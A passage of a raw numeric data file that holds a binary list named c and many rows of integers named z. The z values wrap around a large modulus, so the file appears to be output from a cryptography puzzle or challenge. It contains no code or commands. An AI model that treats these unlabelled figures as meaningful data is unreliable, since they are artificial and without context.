4086345, 389815, 2200161, 223356, 3039163, 645046, 1910260, 2370649, 2560695, 2821951, 3135761, 2983534, 1790948, 2446723, 3025904, 1195223, 1153771, 494973, 3443666, 405468, 1788872, 688372]c = [1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1]z = [[4197800, 4197802, 4197793, 4197793, 4197802, 4197798, 4197799, 4197802, 4197795, 4197799, 4197795, 4197799, 4197803, 4197799, 4197801, 4197796, 4197801, 4197802, 4197796, 4197798, 4197796, 4197800, 4197794, 4197799, 4197803, 4197798, 4197804, 4197805, 4197803, 4197803, 4197800, 4197801, 4197801, 4197802, 4197801, 4197802, 4197797, 4197805, 4197799, 4197800, 4197806, 4197807, 4197807, 4197807, 4197801, 4197805, 4197802, 4197799, 4197805, 4197803, 4197806, 4197801, 4197811, 4197804, 4197799, 4197806, 4197801, 4197812, 4197805, 4197811, 4197808, 4197809, 4197810, 4197803, 4197812, 4197806, 4197808, 4197801, 4197805, 4197809, 4197808, 4197815, 4197811, 4197808, 4197806, 4197812, 4197815, 4197813, 4197813, 4197811, 4197812, 4197815, 4197806, 4197807, 4197807, 4197813, 4197811, 4197803, 4197815, 4197809, 4197813, 4197806, 4197810, 4197815, 4197819, 4197815, 4197813, 4197814, 4197815, 4197813, 4197814, 4197811, 4197815, 4197818, 4197814, 4197815, 4197814, 4197819, 2, 4197811, 4197810, 4197817, 4197812, 4197814, 2, 4197814, 4197820, 4197815, 4197817, 4197816, 4197814, 4197815, 4197812, 4197816, 4197817, 4197820, 4197820, 4197819, 4197820, 4197819, 4197818, 4, 5, 5, 1, 4197819, 2, 4197818, 6, 2, 4197819, 6, 4, 1, 1, 0, 4197818, 7, 2, 6, 2, 12, 7, 4, 6, 5, 5, 8, 7, 9, 9, 10, 16, 11, 4, 10, 4, 6, 5, 9, 14, 4, 6, 4, 8, 9, 14, 15, 13, 7, 13, 13, 11, 11, 16, 20, 10, 17, 6, 13, 16, 17, 19, 16, 17, 16, 16, 20, 20, 19, 13, 14, 12, 12, 16, 11, 17, 15, 20, 12, 18, 14, 13, 29, 25, 23, 17, 12, 21, 21, 21, 14, 17, 9, 23, 20, 19, 23, 19, 17, 20, 22, 19, 22, 16, 20, 17, 21, 19, 18, 24, 28, 27, 29, 28, 24, 26, 23, 30, 24, 15, 28, 28, 23, 20, 23], [4197804, 4197800, 4197807, 4197795, 4197803, 4197802, 4197798, 4197803, 4197803, 4197805, 4197798, 4197798, 4197802, 4197799, 4197802, 4197798, 4197803, 4197800, 4197804, 4197806, 4197802, 4197806, 4197804, 4197806, 4197808, 4197805, 4197807, 4197806, 4197803, 4197806, 4197810, 4197806, 4197805, 4197808, 4197805, 4197807, 4197805, 4197805, 4197806, 4197801, 4197808, 4197809, 4197807, 4197804, 4197809, 4197811, 4197800, 4197811, 4197809, 4197803, 4197810, 4197808, 4197811, 4197802, 4197813, 4197815, 4197808, 4197807, 4197807, 4197811, 4197806, 4197800, 4197813, 4197809, 4197815, 4197806, 4197809, 4197812, 4197812, 4197807, 4197809, 4197814, 4197809, 4197806, 4197815, 4197814, 4197816, 4197808, 4197817, 4197814, 4197811, 4197812, 4197807, 4197817, 4197815, 4197815, 4197817, 4197812, 4197816, 4197810, 4197814, 4197812, 4197818, 4197809, 4197807, 4197813, 4197810, 4197816, 4197810, 4197814, 4197813, 4197815, 4197817, 4197816, 4197815, 4197820, 4197819, 4197811, 4197817, 2, 4197817, 4197814, 0, 1, 0, 4197814, 4197820, 4197815, 4197818, 4197819, 4197814, 4197819, 4, 4197820, 4197819, 4197815, 2, 4197819, 4197817, 3, 7, 2, 4197819, 11, 3, 5, 0, 8, 1, 8, 7, 8, 6, 8, 2, 5, 3, 6, 2, 4, 1, 7, 6, 2, 8, 0, 8, 10, 4, 10, 10, 6, 10, 8, 4, 10, 14, 8, 8, 3, 5, 5, 8, 8, 5, 10, 8, 5, 11, 15, 11, 6, 10, 16, 12, 16, 11, 9, 16, 10, 13, 15, 22, 8, 15, 21, 16, 14, 10, 14, 17, 16, 18, 9, 16, 21, 10, 10, 20, 18, 12, 20, 18, 25, 15, 18, 19, 24, 21, 18, 18, 21, 18, 20, 18, 17, 21, 20, 15, 18, 21, 17, 15, 22, 21, 24, 19, 17, 28, 24, 27, 23, 27, 20, 18, 24, 22, 28, 15, 18, 21, 22, 23, 20, 26, 21], [4197803, 4197801, 4197803, 4197803, 4197804, 4197800, 4197802, 4197796, 4197800, 4197802, 4197802, 4197798, 4197801, 4197802, 4197802, 4197799, 4197809, 4197807, 4197803, 4197810, 4197806, 4197809, 4197800, 4197806, 4197801, 4197801, 4197802, 4197806, 4197805, 4197806, 4197807, 4197803, 4197808, 4197806, 4197811, 4197809, 4197809, 4197806, 4197807, 4197808, 4197806, 4197810, 4197804, 4197799, 4197810, 4197813, 4197811, 4197809, 4197808, 4197814, 4197814, 4197812, 4197813, 4197812, 4197815, 4197813, 4197805, 4197808, 4197808, 4197812, 4197803, 4197809, 4197808, 4197816, 4197814, 4197813, 4197808, 4197813, 4197818, 4197811, 4197810, 4197816, 4197815, 4197811, 4197809, 4197812, 4197814, 4197815, 4197813, 4197811, 4197812, 4197817, 4197812, 4197811, 4197816, 4197818, 4197814, 4197812, 4197810, 4197813, 4197815, 4197804, 4197811, 4197814, 4197810, 4197815, 4197811, 4197817, 4197816, 4197816, 4197818, 4197814, 3, 5, 4197818, 4197810, 0, 4197820, 4197815, 1, 4197813, 4197816, 4197817, 4197813, 4197815, 1, 6, 4197817, 4197817, 4197817, 3, 4197817, 4197819, 2, 4197811, 4197815, 0, 4197819, 4197818, 4197819, 4, 4, 2, 4, 4197818, 2, 6, 5, 5, 4, 0, 1, 1, 3, 4197819, 3, 9, 1, 6, 4, 5, 5, 6, 7, 13, 8, 4, 7, 4, 7, 8, 11, 2, 8, 10, 8, 15, 12, 3, 4, 12, 14, 2, 7, 10, 18, 4, 4, 7, 12, 8, 5, 9, 14, 11, 10, 10, 11, 12, 12, 7, 7, 15, 18, 11, 6, 10, 15, 12, 7, 16, 14, 17, 12, 9, 14, 14, 8, 8, 19, 10, 10, 9, 19, 15, 21, 16, 12, 20, 25, 15, 11, 19, 17, 9, 15, 11, 19, 13, 15, 20, 14, 28, 16, 22, 19, 26, 20, 21, 19, 17, 23, 22, 18, 19, 20, 17, 22, 26, 25, 22, 23, 20, 22, 24, 22], [4197795, 4197796, 4197797, 4197800, 4197799, 4197797, 4197795, 4197800, 4197797, 4197798, 4197808, 4197801, 4197801, 4197800, 4197799, 4197805, 4197799, 4197801, 4197801, 4197802, 4197800, 4197801, 4197803, 4197797, 4197805, 4197803, 4197804, 4197807, 4197803, 4197799, 4197802, 4197803, 4197801, 4197800, 4197807, 4197802, 4197801, 4197803, 4197802, 4197808, 4197803, 4197804, 4197813, 4197805, 4197807, 4197809, 4197806, 4197803, 4197804, 4197799, 4197811, 4197806, 4197804, 4197806, 4197803, 4197810, 4197803, 4197809, 4197809, 4197807, 4197813, 4197812, 4197807, 4197808, 4197806, 4197805, 4197811, 4197811, 4197810, 4197814, 4197810, 4197806, 4197813, 4197815, 4197812, 4197810, 4197805, 4197814, 4197808, 4197809, 4197812, 4197810, 4197810, 4197809, 4197807, 4197816, 4197811, 4197814, 4197806, 4197809, 4197814, 4197815, 4197806, 4197815, 4197814, 4197812, 4197817, 4197809, 4197812, 4197816, 4197811, 4197817, 4197815, 4197820, 4197813, 4197812, 4197811, 4197815, 5, 4197816, 4197817, 4197810, 0, 4197814, 4197818, 4197810, 4197820, 4197820, 1, 4197817, 4197818, 4197819, 4197812, 1, 3, 4197820, 4197818, 4197816, 7, 1, 2, 9, 4197817, 4197817, 4, 11, 2, 5, 7, 3, 4197819, 8, 6, 7, 6, 4, 6, 7, 4, 10, 8, 8, 10, 9, 12, 5, 6, 5, 7, 10, 12, 7, 13, 8, 7, 4, 10, 5, 8, 11, 9, 12, 5, 8, 4, 13, 15, 8, 7, 7, 12, 9, 13, 16, 7, 11, 12, 9, 11, 14, 10, 4, 14, 17, 16, 15, 12, 14, 11, 17, 14, 17, 13, 19, 11, 20, 17, 12, 17, 13, 17, 23, 15, 17, 17, 16, 14, 19, 18, 20, 18, 16, 12, 18, 23, 16, 16, 21, 24, 18, 22, 17, 21, 20, 24, 19, 20, 23, 24, 12, 24, 21, 22, 19, 22, 24, 28, 19, 22, 24, 24, 26, 21, 26, 26, 18], [4197799, 4197801, 4197805, 4197804, 4197805, 4197798, 4197795, 4197801, 4197802, 4197801, 4197797, 4197805, 4197800, 4197803, 4197803, 4197803, 4197806, 4197802, 4197807, 4197797, 4197806, 4197801, 4197800, 4197800, 4197803, 4197806, 4197804, 4197807, 4197804, 4197805, 4197812, 4197808, 4197808, 4197807, 4197809, 4197805, 4197808, 4197811, 4197804, 4197806, 4197807, 4197807, 4197804, 4197806, 4197801, 4197812, 4197807, 4197812, 4197801, 4197811, 4197805, 4197809, 4197811, 4197813, 4197809, 4197807, 4197805, 4197808, 4197811, 4197814, 4197803, 4197809, 4197809, 4197809, 4197811, 4197808, 4197811, 4197806, 4197812, 4197810, 4197817, 4197806, 4197810, 4197811, 4197812, 4197810, 4197808, 4197813, 4197807, 4197817, 4197815, 4197817, 4197814, 4197804, 4197807, 4197817, 4197810, 4197812, 4197810, 4197813, 4197812, 4197812, 4197814, 4197810, 4197812, 4197812, 4197811, 4197815, 4197810, 4197815, 4197810, 4197811, 4197811, 4197818, 4197809, 4197819, 1, 4197813, 4197819, 4197814, 4197816, 4197811, 1, 4197812, 4197811, 4197818, 4197818, 4197810, 4197816, 4197815, 4197813, 4197817, 4197814, 4197816, 4197816, 4197815, 4197813, 4197813, 4197818, 0, 0, 4197814, 4197815, 0, 4197816, 4, 2, 4197819, 4197819, 0, 4197820, 1, 0, 0, 4, 2, 0, 6, 1, 5, 1, 7, 5, 5, 3, 2, 7, 3, 6, 5, 5, 5, 2, 12, 7, 10, 6, 15, 7, 9, 4, 8, 10, 10, 10, 3, 2, 9, 6, 2, 10, 8, 4197819, 13, 13, 6, 6, 11, 6, 8, 8, 12, 12, 10, 12, 8, 11, 12, 9, 11, 16, 16, 10, 2, 12, 11, 7, 9, 9, 7, 12, 13, 14, 13, 13, 10, 14, 18, 16, 15, 14, 13, 13, 12, 13, 10, 10, 12, 18, 12, 17, 19, 17, 13, 15, 23, 7, 11, 17, 11, 19, 14, 17, 15, 23, 26, 23, 18, 22, 24, 22, 17, 20, 17, 17, 24], [4197795, 4197793, 4197799, 4197799, 4197791, 4197798, 4197798, 4197802, 4197804, 4197795, 4197800, 4197805, 4197791, 4197798, 4197803, 4197800, 4197798, 4197793, 4197791, 4197809, 4197800, 4197801, 4197799, 4197804, 4197801, 4197802, 4197803, 4197804, 4197803, 4197806, 4197809, 4197802, 4197805, 4197804, 4197805, 4197808, 4197806, 4197808, 4197810, 4197806, 4197806, 4197803, 4197810, 4197816, 4197814, 4197808, 4197805, 4197808, 4197807, 4197805, 4197811, 4197808, 4197808, 4197805, 4197813, 4197804, 4197818, 4197806, 4197810, 4197811, 4197807, 4197810, 4197816, 4197815, 4197816, 4197813, 4197809, 4197808, 4197807, 4197811, 4197820, 4197807, 4197812, 4197814, 4197810, 4197812, 4197813, 4197814, 4197813, 4197806, 4197811, 4197818, 0, 4197815, 4197808, 4197813, 4197813, 4197817, 4197812, 4197815, 4197809, 4197813, 4197817, 4197811, 4197812, 4197814, 4197818, 4197817, 4197816, 4197819, 4197810, 4197815, 4197817, 4197813, 4197816, 4197816, 4197816, 4197819, 4197815, 4197814, 4197817, 4197818, 0, 4197818, 4197813, 4197820, 4197817, 4197812, 2, 4197819, 4197820, 4197820, 4197818, 4197815, 4197819, 4197820, 4197818, 4197818, 0, 1, 2, 4197820, 0, 4, 4197817, 3, 3, 7, 4197820, 2, 7, 7, 8, 6, 9, 5, 4, 3, 11, 11, 5, 4, 15, 4, 9, 11, 11, 5, 15, 8, 10, 9, 9, 18, 16, 7, 14, 6, 14, 10, 13, 5, 12, 11, 14, 12, 8, 8, 8, 9, 15, 13, 8, 12, 8, 16, 12, 7, 11, 8, 17, 14, 15, 14, 13, 12, 11, 21, 21, 14, 11, 15, 11, 19, 11, 13, 21, 18, 13, 14, 19, 17, 16, 11, 21, 17, 17, 17, 19, 24, 16, 17, 17, 21, 20, 19, 22, 14, 22, 17, 24, 16, 20, 18, 15, 22, 22, 22, 20, 19, 20, 24, 22, 17, 18, 21, 25, 24, 24, 26, 24, 25, 30, 23, 32, 18], [4197797, 4197795, 4197800, 4197798, 4197803, 4197800, 4197796, 4197795, 4197803, 4197802, 4197797, 4197799, 4197801, 4197800, 4197801, 4197800, 4197801, 4197796, 4197796, 4197807, 4197800, 4197804, 4197806, 4197797, 4197800, 4197801, 4197803, 4197803, 4197806, 4197806, 4197805, 4197801, 4197801, 4197801, 4197800, 4197796, 4197805, 4197801, 4197805, 4197801, 4197802, 4197804, 4197805, 4197805, 4197807, 4197805, 4197806, 4197809, 4197803, 4197799, 4197800, 4197807, 4197807, 4197808, 4197813, 4197807, 4197807, 4197804, 4197807, 4197807, 4197804, 4197810, 4197806, 4197814, 4197805, 4197809, 4197803, 4197806, 4197801, 4197806, 4197811, 4197812, 4197812, 4197815, 4197807, 4197809, 4197814, 4197810, 4197807, 4197817, 4197819, 4197810, 4197803, 4197808, 4197805, 4197810, 4197809, 4197814, 4197810, 4197812, 4197808, 4197811, 4197811, 4197809, 4197808, 4197809, 4197813, 4197809, 4197814, 4197810, 4197807, 4197810, 4197810, 4197815, 4197815, 4197813, 4197817, 4197819, 4197809, 4197815, 4197813, 4197814, 4197816, 4197818, 4197811, 4197814, 4197812, 4197808, 4197812, 4197815, 4197818, 4197817, 4197812, 4197818, 4197815, 4197819, 4197819, 4197814, 4197817, 4197815, 0, 0, 4197815, 4197817, 4197819, 4197819, 4197819, 5, 4197820, 3, 2, 1, 0, 2, 5, 4, 3, 2, 0, 2, 3, 2, 4, 4, 7, 6, 6, 13, 7, 7, 4, 8, 13, 11, 13, 6, 11, 7, 6, 7, 11, 14, 6, 13, 8, 15, 8, 16, 6, 13, 19, 14, 16, 12, 6, 9, 10, 14, 15, 13, 12, 14, 15, 14, 11, 16, 9, 11, 9, 12, 17, 11, 13, 5, 18, 20, 21, 14, 17, 12, 7, 14, 21, 16, 21, 12, 5, 15, 12, 17, 13, 16, 16, 20, 17, 17, 16, 17, 14, 16, 22, 20, 16, 14, 21, 17, 20, 18, 24, 18, 18, 22, 17, 18, 18, 24, 23, 19, 19, 23, 24, 19, 18, 20, 24, 21], [4197802, 4197800, 4197803, 4197802, 4197807, 4197800, 4197804, 4197806, 4197802, 4197801, 4197802, 4197807, 4197802, 4197801, 4197799, 4197796, 4197806, 4197800, 4197800, 4197804, 4197807, 4197799, 4197797, 4197805, 4197806, 4197803, 4197803, 4197809, 4197809, 4197803, 4197801, 4197808, 4197805, 4197812, 4197804, 4197807, 4197804, 4197808, 4197811, 4197803, 4197807, 4197808, 4197810, 4197806, 4197806, 4197811, 4197807, 4197808, 4197806, 4197807, 4197806, 4197811, 4197807, 4197809, 4197815, 4197812, 4197813, 4197809, 4197811, 4197816, 4197809, 4197817, 4197812, 4197807, 4197812, 4197810, 4197809, 4197808, 4197810, 4197807, 4197809, 4197812, 4197804, 4197811, 4197810, 4197814, 4197810, 4197803, 4197815, 4197810, 4197807, 4197809, 4197807, 4197819, 4197808, 4197814, 4197810, 4197815, 4197810, 4197817, 4197815, 4197815, 4197819, 4197809, 4197820, 4197817, 4197815, 4197811, 4197809, 4197820, 4197816, 4197811, 4197818, 4197817, 1, 4197820, 4197814, 4197819, 4197815, 3, 4197819, 4197818, 1, 4197817, 4197818, 4197812, 4197820, 4197820, 2, 4197817, 4197817, 4197816, 4197816, 4197817, 4197818, 4197815, 4197815, 2, 1, 4197820, 3, 4197813, 3, 4197818, 4197816, 4, 4, 4, 6, 3, 11, 3, 4, 6, 7, 10, 5, 10, 6, 7, 4197820, 11, 12, 10, 7, 10, 4, 14, 9, 14, 10, 13, 14, 9, 7, 3, 13, 6, 13, 7, 10, 15, 13, 11, 8, 15, 9, 9, 17, 4, 12, 10, 8, 8, 13, 12, 8, 15, 15, 11, 11, 15, 16, 17, 12, 18, 12, 12, 15, 14, 9, 16, 9, 17, 19, 11, 24, 15, 11, 16, 16, 12, 13, 15, 22, 11, 16, 14, 15, 22, 21, 22, 18, 17, 17, 20, 22, 16, 18, 21, 16, 15, 16, 17, 19, 15, 18, 22, 21, 26, 23, 23, 28, 20, 21, 21, 23, 25, 18, 24, 20, 20, 23, 15, 23, 26], [4197790, 4197801, 4197799, 4197794, 4197802, 4197797, 4197799, 4197794, 4197798, 4197797, 4197806, 4197801, 4197791, 4197805, 4197796, 4197801, 4197806, 4197797, 4197807, 4197803, 4197804, 4197798, 4197803, 4197805, 4197804, 4197798, 4197809, 4197800, 4197806, 4197802, 4197799, 4197803, 4197806, 4197804, 4197805, 4197807, 4197810, 4197803, 4197803, 4197803, 4197812, 4197808, 4197808, 4197812, 4197804, 4197810, 4197802, 4197806, 4197808, 4197816, 4197808, 4197808, 4197809, 4197810, 4197804, 4197808, 4197803, 4197813, 4197808, 4197808, 4197808, 4197815, 4197807, 4197809, 4197815, 4197805, 4197814, 4197808, 4197808, 4197812, 4197815, 4197809, 4197810, 4197813, 4197810, 4197809, 4197820, 4197810, 4197814, 4197807, 4197810, 4197808, 4197805, 4197810, 4197811, 4197817, 4197808, 4197810, 4197812, 4197809, 4197813, 4197815, 4197812, 4197814, 4197817, 4197818, 4197807, 4197816, 4197814, 4197814, 4197812, 4197812, 4197820, 4197818, 4197811, 4197814, 4197814, 4197817, 4197815, 4197817, 2, 4197818, 4197819, 4197808, 4197812, 4197818, 4197817, 4197818, 4197820, 4197818, 3, 4197817, 0, 4197820, 4197819, 4197820, 1, 1, 2, 5, 4197815, 5, 4197820, 1, 4197819, 7, 6, 6, 7, 6, 5, 4, 1, 12, 7, 10, 0, 9, 12, 6, 5, 11, 12, 8, 8, 10, 13, 8, 2, 7, 13, 11, 10, 5, 8, 12, 7, 4, 8, 18, 8, 8, 12, 8, 4, 9, 13, 22, 10, 11, 1, 13, 14, 11, 12, 10, 12, 10, 12, 12, 12, 14, 8, 10, 13, 10, 10, 14, 10, 17, 13, 14, 16, 11, 17, 9, 18, 12, 15, 7, 15, 20, 10, 17, 17, 16, 16, 14, 14, 18, 17, 12, 15, 16, 22, 16, 20, 21, 17, 20, 22, 15, 25, 18, 21, 27, 26, 22, 22, 22, 21, 19, 19, 24, 23, 26, 19, 26, 18, 24, 22, 26, 27, 22, 21, 21], [4197797, 4197792, 4197799, 4197792, 4197798, 4197801, 4197802, 4197799, 4197802, 4197795, 4197795, 4197798, 4197798, 4197796, 4197802, 4197793, 4197805, 4197804, 4197804, 4197804, 4197801, 4197801, 4197801, 4197802, 4197798, 4197799, 4197797, 4197802, 4197801, 4197802, 4197801, 4197803, 4197806, 4197804, 4197806, 4197803, 4197810, 4197811, 4197814, 4197801, 4197808, 4197806, 4197804, 4197802, 4197799, 4197810, 4197804, 4197804, 4197806, 4197806, 4197812, 4197806, 4197813, 4197811, 4197809, 4197811, 4197803, 4197816, 4197809, 4197809, 4197803, 4197812, 4197810, 4197806, 4197804, 4197812, 1, 4197814, 4197811, 4197809, 4197814, 4197808, 4197813, 4197817, 4197810, 4197810, 4197807, 4197802, 4197810, 4197808, 4197813, 4197807, 4197814, 4197811, 4197813, 4197814, 4197817, 4197813, 4197816, 4197813, 4197814, 4197816, 4197810, 4197816, 4197811, 4197815, 4197812, 4197807, 4197812, 4197817, 4197815, 4197819, 4197815, 4197812, 4197816, 0, 4197813, 4197816, 4197815, 4197819, 4197820, 4197812, 4197818, 4197813, 4197818, 4197812, 0, 4197818, 1, 4197817, 4, 4197816, 4197818, 1, 9, 4197813, 4197819, 4197814, 4197816, 0, 4197815, 1, 4197817, 3, 9, 1, 3, 5, 2, 6, 7, 9, 3, 10, 10, 9, 5, 10, 11, 9, 10, 10, 9, 16, 7, 5, 11, 15, 5, 4, 6, 8, 11, 9, 7, 12, 17, 17, 11, 15, 12, 12, 14, 10, 10, 15, 13, 17, 9, 11, 11, 10, 12, 13, 12, 14, 15, 16, 13, 12, 10, 19, 14, 13, 8, 16, 13, 15, 18, 19, 17, 22, 20, 18, 13, 18, 15, 12, 15, 15, 14, 11, 16, 16, 14, 16, 20, 16, 12, 22, 20, 22, 18, 17, 21, 20, 11, 11, 20, 15, 18, 22, 21, 24, 31, 22, 20, 22, 26, 21, 15, 26, 19, 25, 24, 27, 22, 19, 19, 28, 24, 25, 27, 33, 27, 20], [4197794, 4197797, 4197802, 4197799, 4197797, 4197805, 4197801, 4197806, 4197795, 4197803, 4197798, 4197801, 4197802, 4197800, 4197803, 4197806, 4197806, 4197798, 4197809, 4197805, 4197805, 4197798, 4197803, 4197803, 4197806, 4197804, 4197802, 4197803, 4197798, 4197804, 4197805, 4197803, 4197807, 4197805, 4197810, 4197798, 4197804, 4197806, 4197808, 4197801, 4197811, 4197805, 4197805, 4197809, 4197802, 4197802, 4197798, 4197806, 4197806, 4197808, 4197807, 4197806, 4197809, 4197813, 4197809, 4197800, 4197808, 4197808, 4197806, 4197807, 4197804, 4197804, 4197805, 4197811, 4197806, 4197806, 4197809, 4197811, 4197810, 4197815, 4197807, 4197812, 4197814, 4197812, 4197811, 4197809, 4197809, 4197805, 4197811, 4197811, 4197811, 4197815, 4197811, 4197812, 4197812, 4197814, 4197813, 4197815, 4197814, 4197811, 4197809, 4197811, 4197814, 4197814, 4197813, 4197811, 4197813, 4197817, 4197814, 4197817, 4197817, 4197815, 4197819, 4197817, 4197811, 1, 4197816, 4197818, 4197816, 4197815, 4197815, 4197816, 4197818, 4197820, 0, 4, 3, 4197819, 4197819, 3, 4197813, 4197816, 2, 4197820, 4197820, 4197818, 4197818, 2, 4197818, 3, 5, 4, 1, 4, 1, 6, 8, 10, 0, 1, 9, 5, 3, 10, 3, 7, 2, 10, 7, 7, 9, 5, 12, 4197818, 8, 5, 10, 7, 9, 4, 8, 10, 5, 5, 14, 13, 12, 14, 10, 7, 8, 9, 8, 11, 10, 12, 9, 10, 7, 10, 16, 17, 5, 15, 8, 11, 6, 9, 12, 10, 17, 21, 16, 12, 17, 15, 19, 17, 19, 21, 18, 16, 16, 15, 17, 16, 13, 9, 18, 19, 16, 16, 15, 19, 16, 17, 18, 15, 19, 18, 11, 19, 14, 23, 17, 23, 23, 25, 15, 24, 17, 15, 17, 18, 23, 17, 15, 17, 19, 21, 20, 18, 24, 30, 21, 21, 21, 27, 27, 19, 25, 20, 21, 21, 24, 23], [4197792, 4197795, 4197794, 4197792, 4197798, 4197796, 4197798, 4197800, 4197799, 4197794, 4197798, 4197804, 4197800, 4197794, 4197793, 4197796, 4197802, 4197798, 4197802, 4197795, 4197796, 4197801, 4197797, 4197807, 4197803, 4197803, 4197803, 4197807, 4197795, 4197795, 4197803, 4197803, 4197805, 4197805, 4197802, 4197805, 4197805, 4197809, 4197799, 4197810, 4197804, 4197805, 4197806, 4197812, 4197809, 4197805, 4197805, 4197807, 4197804, 4197808, 4197806, 4197797, 4197805, 4197808, 4197807, 4197809, 4197817, 4197807, 4197804, 4197811, 4197811, 4197806, 4197805, 4197805, 4197806, 4197806, 4197817, 4197803, 4197811, 4197804, 4197813, 4197806, 4197814, 4197809, 4197809, 4197813, 4197807, 4197805, 4197810, 4197813, 4197816, 4197810, 4197809, 4197808, 4197813, 4197807, 4197810, 4197812, 4197814, 4197810, 4197813, 4197818, 4197818, 4197813, 4197819, 4197806, 4197808, 4197811, 4197813, 4197814, 4197813, 4197815, 4197806, 4197805, 4197817, 4197818, 4197817, 4197817, 4197816, 4197818, 4197818, 4197818, 4197817, 4197817, 4197818, 2, 4197811, 4197815, 1, 4197817, 1, 4197819, 4197817, 1, 0, 4197818, 4197819, 2, 4, 4197820, 4197817, 1, 2, 4197820, 6, 2, 2, 8, 6, 8, 8, 15, 10, 5, 7, 10, 0, 2, 4, 11, 5, 7, 7, 12, 5, 6, 15, 10, 11, 15, 12, 11, 9, 11, 7, 9, 13, 10, 8, 7, 15, 8, 15, 10, 15, 13, 11, 15, 14, 9, 15, 7, 17, 12, 14, 13, 16, 8, 9, 13, 18, 22, 14, 13, 17, 20, 20, 16, 20, 16, 16, 14, 18, 21, 18, 17, 18, 21, 18, 20, 15, 22, 11, 18, 18, 19, 18, 18, 23, 28, 21, 21, 20, 20, 21, 28, 27, 23, 18, 16, 26, 22, 23, 19, 23, 22, 21, 21, 22, 29, 27, 24, 26, 22, 21, 20, 25, 26, 27, 27, 21, 27, 34, 28, 23, 23], [4197802, 4197797, 4197802, 4197796, 4197804, 4197799, 4197797, 4197797, 4197801, 4197800, 4197800, 4197803, 4197797, 4197806, 4197799, 4197803, 4197807, 4197808, 4197807, 4197800, 4197803, 4197799, 4197805, 4197799, 4197805, 4197808, 4197804, 4197802, 4197805, 4197810, 4197810, 4197807, 4197808, 4197807, 4197806, 4197796, 4197806, 4197804, 4197811, 4197807, 4197804, 4197809, 4197807, 4197802, 4197806, 4197809, 4197813, 4197806, 4197807, 4197811, 4197802, 4197812, 4197807, 4197808, 4197809, 4197810, 4197811, 4197804, 4197802, 4197809, 4197808, 4197818, 4197812, 4197810, 4197811, 4197816, 4197805, 4197805, 4197813, 4197815, 4197809, 4197810, 4197818, 4197810, 4197809, 4197815, 4197812, 4197811, 4197810, 4197817, 4197813, 4197817, 4197813, 4197809, 4197814, 4197809, 4197813, 4197812, 4197811, 4197813, 4197811, 4197815, 4197815, 4197816, 4197811, 4197813, 4197813, 4197818, 4197813, 4197815, 4197814, 4197812, 4197811, 4197814, 4197816, 4197817, 4197820, 4197817, 2, 4197815, 4197817, 4197814, 1, 4197813, 4197818, 4197820, 5, 4197817, 4197814, 4197820, 4197817, 4197816, 4197818, 3, 4197818, 4197820, 4197819, 2, 0, 2, 4, 4197820, 4197820, 3, 4197819, 4197819, 2, 2, 4, 4197819, 3, 3, 5, 6, 2, 11, 4, 2, 4, 0, 7, 3, 9, 3, 7, 3, 5, 5, 8, 11, 7, 14, 12, 10, 9, 10, 9, 6, 4, 11, 8, 10, 6, 12, 5, 14, 11, 11, 7, 18, 13, 10, 11, 15, 6, 11, 9, 1, 8, 15, 15, 9, 8, 13, 10, 10, 13, 17, 11, 17, 12, 14, 16, 10, 12, 15, 16, 13, 11, 14, 14, 12, 15, 16, 17, 17, 18, 13, 16, 16, 19, 11, 15, 13, 18, 10, 19, 17, 17, 20, 24, 16, 17, 15, 18, 13, 16, 18, 12, 15, 20, 21, 16, 20, 24, 18, 22, 27, 24, 19, 18, 18, 15, 22, 19, 23], [4197805, 4197801, 4197798, 4197802, 4197804, 4197806, 4197801, 4197805, 4197798, 4197805, 4197806, 4197805, 4197804, 4197810, 4197802, 4197802, 4197803, 4197811, 4197805, 4197802, 4197804, 4197804, 4197800, 4197803, 4197799, 4197801, 4197804, 4197806, 4197802, 4197801, 4197807, 4197801, 4197809, 4197807, 4197808, 4197808, 4197809, 4197805, 4197804, 4197806, 4197811, 4197803, 4197806, 4197801, 4197804, 4197811, 4197808, 4197810, 4197813, 4197812, 4197805, 4197802, 4197809, 4197811, 4197813, 4197801, 4197802, 4197811, 4197806, 4197801, 4197803, 4197811, 4197814, 4197806, 4197815, 4197813, 4197812, 4197811, 4197810, 4197816, 4197808, 4197811, 4197810, 4197813, 4197810, 4197815, 4197809, 4197804, 4197811, 4197811, 4197812, 4197816, 4197810, 4197814, 4197815, 4197813, 4197813, 4197809, 4197812, 4197811, 4197812, 4197816, 4197817, 4197812, 4197815, 4197812, 4197817, 4197816, 4197816, 2, 4197818, 4197815, 4197817, 4197819, 4197819, 4197810, 4197814, 4197818, 4197817, 4197819, 4197819, 4197816, 4197815, 4197818, 4197817, 4197817, 4197819, 4197815, 4197814, 4197819, 1, 4197817, 4197815, 0, 4197819, 4197817, 4197820, 4197815, 4197816, 3, 3, 0, 2, 1, 4197818, 1, 1, 3, 4197817, 4197819, 4197820, 4197819, 1, 4, 4197820, 4, 1, 1, 5, 11, 5, 9, 3, 3, 4197820, 0, 7, 1, 10, 4, 5, 5, 3, 2, 12, 9, 8, 3, 10, 6, 8, 1, 12, 4, 3, 8, 9, 16, 10, 3, 10, 12, 9, 17, 7, 